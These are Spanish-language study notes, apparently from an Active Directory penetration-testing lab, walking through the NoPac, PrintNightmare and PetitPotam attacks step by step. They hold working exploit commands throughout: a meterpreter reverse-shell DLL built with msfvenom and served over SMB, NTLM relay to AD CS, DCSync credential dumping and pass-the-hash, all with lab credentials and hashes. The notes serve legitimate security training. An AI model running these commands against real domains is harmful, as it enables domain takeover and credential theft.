## NoPac (Suplantacion de SamAccountName)

[Vulnerabilidad Sam_The_Admin](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699) o noPac o SamAccountName Spoofing: permite escalar privs en el dominio desde cualquier usuario estandar hasta el nivel de Domain Admin con un solo comando

Aprovechamos la posibilidad de cambiar el SamAccountNmae de una cuenta de equipo por el de Domain Controller:

- Por defecto los usuarios autenticados pueden añadir hasta 10 equipos de un dominio
- Cuando se hace cambiamos el nombre del nuevo host para que coincida con el SamAccountName de un DC
- Tras esto solicitamos tickets Kerberos haciendo que el servicio Kerberos nos devuelva tickets con el nombre del DC en lugar del nuevo nombre
- Tendremos acceso como ese servicio e incluso se nos puede proporcionar una shell SYSTEM en el DC

[Herramienta para el ataque](https://github.com/Ridter/noPac):

1. Instalamos Impacket y la herramienta noPac

```
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git
```

2. Usamos los scripts de NoPac para comprobar que el sistema es vulnerable `scanner.py` y despues ejecutamos el exploit `noPac.py` para obtener la shell SYSTEM

	Podemos usar el escaner con una cuenta de dominio estandar para intentar obtener el TGT del DC objetivo. Si tiene exito el sistema es vuln. En algunos sistemas el `ms-DS-MachineAccountQuota` esta establecido en 10, si esta en 0 el ataque fallara porque no tendremos derechos de añadir una nueva maquina

```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
![[Pasted image 20260929182617.png]]

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
![[Pasted image 20260929182644.png]]

Notaremos que se establece una `sesión de shell semi-interactiva` con el objetivo utilizando [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Ten en cuenta que con las shells de smbexec tendremos que usar rutas exactas en lugar de navegar por la estructura de directorios usando `cd`


3. NoPac guarda el TGT en el host de ataque

```
ls
```
![[Pasted image 20260929182754.png]]

4. Podriamos usar el archivo cchache para realizar otros ataques como DCSync (podemos hacer esto con la herramienta especificando -dump y usara secretsdump)

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
![[Pasted image 20260929182917.png]]



## PrintNightmare

Se ejecuta en todos los SO Windows y permite escalada de privs y la ejecucion remota de codigo

La tratamos en Escalada de privs Windows pero vamos a verla dentro de un AD

Exploit: [cube0x0](https://twitter.com/cube0x0?lang=en)

Para que funcione necesitaremos la version Impacket de cube0x0

```
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

1. Usamos rpcdump.py para ver si `Print System Asynchronous Protocol` y `Print System Remote Protocol` estan expuestos en el objetivo:

```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
![[Pasted image 20260929183327.png]]

2. Tras confirmarlo podemos proceder a intentar usar el exploit. Primero creamos un payload DLL con msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
![[Pasted image 20260929183418.png]]

3. Alojamos el payload en un smbserver.py

```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
![[Pasted image 20260929183442.png]]

4. Abrimos un listener en MSF

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```
![[Pasted image 20260929183528.png]]

5. Ejecutamos el exploit:

```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (MS-EFSRPC)

Es una vulnerabilidad de suplantacion de LSA que permite a un atacante no autenticado forzar a un DC autenticarse contra otro host usando NTLM por el puerto 445 a traves del protocolo LSARPC abusando el protocolo MS-EFSRPC

Esta técnica permite a un atacante no autenticado tomar el control de un dominio de Windows donde los [Servicios de Certificados de Active Directory (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) están en uso. En el ataque, una solicitud de autenticación del controlador de dominio objetivo es retransmitida a la página de inscripción web del host de la Autoridad de Certificación (CA) y realiza una solicitud de firma de certificado (CSR) para un nuevo certificado digital

Luego este certificado puede ser usado con una herramienta como `Rubeus` o `gettgtpkinit.py` de [PKINITtools](https://github.com/dirkjanm/PKINITtools)


1. Iniciamos ntlmrelayx.py en una ventana de nuestro host de ataque donde especificamos la URL de inscripcion para el host CA y usando la plantilla AD CS

	Si no conociéramos la ubicación de la CA, podríamos usar una herramienta como [certi](https://github.com/zer1t0/certi) para intentar localizarla

```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
![[Pasted image 20260929184048.png]]

2. En otra ventana ejecutamos [PetitPotam.py](https://github.com/topotam/PetitPotam) para intentar forzar al DC a autenticarse en nuestro host 

```
python3 PetitPotam.py <IP del host de ataque> <IP del controlador de dominio>
```
![[Pasted image 20260929184248.png]]

	Existe una versión ejecutable de esta herramienta que se puede ejecutar desde un host de Windows

El disparador tambien se ha añadido a Mimikatz y se puede lanzar usando:

```
misc::efs /server:<Controlador de dominio> /connect:<HOST DE ATAQUE>
```


3. Capturamos el certificado en BASE64 para DC01

![[Pasted image 20260929184320.png]]![[Pasted image 20260929184330.png]]

4. Podemos usar el certificado y gettgtpkinit.py para solicitar un TGT para el DC

```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
![[Pasted image 20260929184426.png]]

5. El TGT que recogimos se guardo en `dc01.ccache` por lo que ahora lo establecemos en la variable KRB5CCNAME

```
export KRB5CCNAME=dc01.ccache
klist
```
![[Pasted image 20260929184715.png]]


6. Ahora usamos el TGT con secretsdump para realizar un DCSync y recuperar todos los hashes NTLM del dominio

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
![[Pasted image 20260929184607.png]]

7. Confirmando acceso de administrador al controlador de dominio mediante PtH

```
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
![[Pasted image 20260929184752.png]]


#### Ruta alternativa

Una vez tenemos TGT usaremos la herramietna de PKINITtools `getnthash` para solicitar el hash NT a traves de una solicitud TGS para nuestro objetivo usando Kerberos U2U

Esto se puede descifrar con la clave de cifrado AS-REP que obtuvimos al solicitar el TGT anteriormente.

```
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
![[Pasted image 20260929185047.png]]

Ahora podemos usar el ahsh para hacer el DCSync con secretsdump

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
![[Pasted image 20260929185116.png]]

#### Otra alternativa

Al recuperar el hash del certificado en ntlmrelayx podriamos usar el certificado en Rubeus desde un Windows para solicitar el TGT y realizar un PTT todo a la vez

	Necesitaremos un host Windows

```
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
![[Pasted image 20260929185246.png]]![[Pasted image 20260929185255.png]]

Escribimos klist para confirmar de que el ticket esta en la memoria:

```
klist
```
![[Pasted image 20260929185322.png]]

De nuevo, dado que los controladores de dominio tienen privilegios de replicación en el dominio, podemos usar el pass-the-ticket para realizar un ataque DCSync usando Mimikatz desde nuestro host de ataque de Windows. Aquí, obtenemos el hash NT para la cuenta KRBTGT, que podría usarse para crear un Golden Ticket y establecer persistencia. Podríamos obtener el hash NT de cualquier usuario privilegiado usando DCSync y pasar a la siguiente fase de nuestra evaluación 

```
cd .\mimikatz\x64\
.\mimikatz.exe
# lsadump::dcsync /user:inlanefreight\krbtgt
```
